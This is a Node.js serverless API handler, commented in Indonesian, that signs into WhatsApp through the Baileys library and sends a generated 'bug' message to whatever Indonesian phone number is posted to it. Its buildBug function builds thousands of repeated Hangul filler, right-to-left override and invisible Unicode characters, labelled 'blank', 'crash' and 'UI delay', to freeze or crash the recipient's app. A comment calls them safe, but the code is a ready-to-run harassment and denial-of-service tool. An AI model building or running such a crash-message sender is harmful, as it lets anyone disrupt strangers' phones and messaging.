// /api/send-bug.js
const { makeWASocket, useSingleFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const path  = require('path');
const fs    = require('fs');

// â”€â”€ 1. Lokasi file auth sesi WhatsApp (tersimpan otomatis) â”€â”€
const authFile = path.join(__dirname, 'auth', 'creds.json');
fs.mkdirSync(path.dirname(authFile), { recursive: true });
const { state, saveState } = useSingleFileAuthState(authFile);

let sock; // socket Baileys (global)

async function startSock() {
  sock = makeWASocket({
    auth: state,
    printQRInTerminal: true,      // QR muncul 1Ã— di log fungsi
    version: [2, 2413, 2],        // versi WA Web stabil (boleh di-skip)
    browser: ['BugPanel', 'Vercel', '1.0'],
  });

  // simpan kredensial bila ada pembaruan
  sock.ev.on('creds.update', saveState);

  // reconnect otomatis jika terputus
  sock.ev.on('connection.update', ({ connection, lastDisconnect }) => {
    if (connection === 'close') {
      const shouldReconnect = (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut);
      if (shouldReconnect) startSock();
    }
  });
}
startSock();

// â”€â”€ 2. Fungsi pembangkit teks bug aman (delay tapi tidak exploit) â”€â”€
function buildBug(type = 'ui') {
  if (type === 'blank')  return '\u3164'.repeat(8000);                       // karakter spasi Hangul
  if (type === 'crash')  return '\u200F\u202E'.repeat(2500) + 'ðŸ”’'.repeat(400);
  /* default -- UI Delay */
  return '\u200F\u202E\u2063\u3164'.repeat(3000);
}

// â”€â”€ 3. Handler Vercel: terima POST JSON { nomor, jenis } â”€â”€
module.exports = async (req, res) => {
  if (req.method !== 'POST')
    return res.status(405).json({ status: 'Gunakan POST' });

  const { nomor, jenis } = req.body || {};
  if (!nomor || !/^62\d+$/.test(nomor))
    return res.status(400).json({ status: 'Format nomor salah (harus 62xxxxx)' });

  try {
    const jid = `${nomor}@s.whatsapp.net`;
    const text = buildBug(jenis);
    await sock.sendMessage(jid, { text });

    return res.status(200).json({ status: `Bug '${jenis}' terkirim ke ${nomor}` });
  } catch (e) {
    return res.status(500).json({ status: `Gagal: ${e.message}` });
  }
};
